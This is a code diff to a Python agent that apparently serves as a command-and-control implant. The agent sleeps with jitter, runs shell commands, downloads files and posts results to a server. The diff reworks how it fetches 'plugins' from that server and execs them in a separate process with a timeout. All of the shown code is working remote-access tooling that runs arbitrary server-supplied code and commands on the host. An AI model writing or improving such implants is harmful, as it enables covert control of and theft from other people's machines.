@@ -10,7 +10,7 @@ import getpass
 import platform
 from cryptography.fernet import Fernet
 import importlib.util
-
+from multiprocessing import Process
 
 
 SERVER_URL = "http://localhost:5000"
@@ -157,7 +157,7 @@ def execute_task(task, task_uuid):
         SLEEP_MAX = task.get("max", SLEEP_MAX)
 
         print(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds")
-        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds", task_uuid)
+        post_result(f"[+] Sleep changed to {SLEEP_MIN}-{SLEEP_MAX} seconds",task_uuid)
 
 
 def execute_shell(command, task_uuid):
@@ -183,6 +183,29 @@ def execute_shell(command, task_uuid):
         post_result(e.output.decode(), task_uuid)
 
 
+# 1. Move the inner function to the top level
+def execute_plugin(content, module_name, task_uuid):
+    """This function is now picklable because it is at the top level."""
+    try:
+        spec = importlib.util.spec_from_loader(module_name, loader=None)
+        module = importlib.util.module_from_spec(spec)
+
+        # Execute the code within the module's namespace
+        exec(content, module.__dict__)
+        sys.modules[module_name] = module
+
+        if hasattr(module, "run"):
+            module.run()
+            print(f"[+] Plugin '{module_name}' executed successfully")
+            post_result(f"Plugin '{module_name}' executed", task_uuid)
+        else:
+            print(f"[!] Plugin '{module_name}' has no run() function")
+            post_result(f"Plugin '{module_name}' has no run() function", task_uuid)
+
+    except Exception as e:
+        print(f"[!] Plugin '{module_name}' crashed: {e}")
+        post_result(f"Plugin '{module_name}' crashed: {e}", task_uuid)
+
 def download_file(url, save_as=None, task_uuid=None):
     try:
         print(f"[+] Downloading {url}")
@@ -192,20 +215,20 @@ def download_file(url, save_as=None, task_uuid=None):
         if "/plugins" in url:
             content = r.text.replace("\r\n", "\n")
             module_name = url.split("/")[-1].replace(".py", "")
-            spec = importlib.util.spec_from_loader(module_name, loader=None)
-            module = importlib.util.module_from_spec(spec)
-            exec(content, module.__dict__)
-            sys.modules[module_name] = module
 
-            if hasattr(module, "run"):
-                module.run()
-                print(f"[+] Plugin '{module_name}' executed successfully")
-                # ✅ Mark task as done immediately
-                post_result(f"Plugin '{module_name}' executed", task_uuid)
-            else:
-                print(f"[!] Plugin '{module_name}' has no run() function")
-                post_result(f"Plugin '{module_name}' has no run() function", task_uuid)
+            # 2. Pass arguments to the top-level function via 'args'
+            p = Process(
+                target=execute_plugin,
+                args=(content, module_name, task_uuid)
+            )
+            p.start()
+            p.join(timeout=10)
 
+            if p.is_alive():
+                print(f"[!] Plugin '{module_name}' timed out, terminating...")
+                p.terminate()
+                p.join()
+                post_result(f"Plugin '{module_name}' aborted due to timeout", task_uuid)
         else:
             if save_as is None:
                 save_as = url.split("/")[-1]
